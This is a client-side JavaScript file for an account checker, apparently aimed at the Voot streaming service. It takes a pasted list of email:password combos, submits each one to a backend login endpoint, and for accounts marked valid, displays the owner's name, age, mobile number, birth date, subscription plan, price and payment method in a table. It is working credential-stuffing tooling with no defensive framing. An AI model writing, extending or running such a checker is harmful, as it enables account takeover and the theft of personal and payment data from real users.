var splited;
$( document ).ready(function() {
    $("#submitForm").click(function(){
        var textArea = $("#accounts").val();
        splited = textArea.split("\n").map(e=>e.split(' ')[0]).filter(e=>validateEmail(e.split(':')[0]));
        promises(splited.map(e=>e.split(' ')[0]),0);
        console.log("splited",splited);

    });
});

function promises(arr,i){
    if(i === arr.length)
        return;
    $.post(
        {
            type:'POST',
            url:'services/voot',
            contentType: 'application/json',
            data: JSON.stringify({
                login:arr[i].split(":")[0],
                password:arr[i].split(":")[1]
            }),
            success: function(data) {
                promises(arr,i+1);
                console.log('post success');
                console.log(JSON.stringify(data));
                prependerModified(data);
            },
            error: function(data) {
                promises(arr,i+1);
                console.log('post error');
                console.log(JSON.stringify(data));
            }
        }
    )
    $('#progressBar').css('width',(i+1) / splited.length * 100 +"%");

}



function prependerModified(account) {
    var
        email = account.accountLogin.email,
        password = account.accountLogin.password,
        age = 'X',
        name='X',
        gender='X',
        mobile='X',
        languages='X',
        birthDate= 'X',
        firstName='X',
        profileName='X',
        lastName='X',
        isTemporaryPassword='X',
        isPasswordChangeable='X',
        start='X',
        end='X',
        duration='X',
        plan='X',
        isRenewable='X',
        price='X',
        paymentMethod='X',
        PaymentGateway='X'
    ;
    if (account.validAccount) {
            age = account.accountInfo.age;
            name=account.accountInfo.name;
            gender=account.accountInfo.gender;
            mobile=account.accountInfo.mobile;
            languages=account.accountInfo.languages;
            birthDate= account.accountInfo.birthDate;
            firstName=account.accountInfo.firstName;
            profileName=account.accountInfo.profileName;
            lastName=account.accountInfo.lastName;
            isTemporaryPassword=account.accountInfo.isTemporaryPassword;
            isPasswordChangeable=account.accountInfo.isPasswordChangeable;
            start=account.accountInfo.paymentInfo.start;
            end=account.accountInfo.paymentInfo.end;
            duration=account.accountInfo.paymentInfo.duration;
            plan=account.accountInfo.paymentInfo.plan;
            isRenewable=account.accountInfo.paymentInfo.isRenewable;
            price=account.accountInfo.paymentInfo.price;
            paymentMethod=account.accountInfo.paymentInfo.paymentMethod;
            PaymentGateway=account.accountInfo.paymentInfo.PaymentGateway;


    }
    $('tbody').prepend('<tr>' +
        '      <th scope="row">' + account.validAccount + '</th>' +
        '      <td>' + email + '</td>' +
        '      <td>' + password + '</td>' +
        '      <td>' + age + '</td>' +
        '      <td>' + languages + '</td>' +
        '      <td>' + birthDate + '</td>' +
        '      <td>' + firstName + '</td>' +
        '      <td>' + profileName + '</td>' +
        '      <td>' + lastName + '</td>' +
        '      <td>' + gender + '</td>' +
        '      <td>' + isTemporaryPassword + '</td>' +
        '      <td>' + isPasswordChangeable + '</td>' +
        '      <td>' + start + '</td>' +
        '      <td>' + end + '</td>' +
        '      <td>' + duration + '</td>' +
        '      <td>' + plan + '</td>' +
        '      <td>' + isRenewable + '</td>' +
        '      <td>' + price + '</td>' +
        '      <td>' + paymentMethod + '</td>' +
        '      <td>' + PaymentGateway + '</td>' +
        '    </tr>')

}
function validateEmail(email) {
    const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}
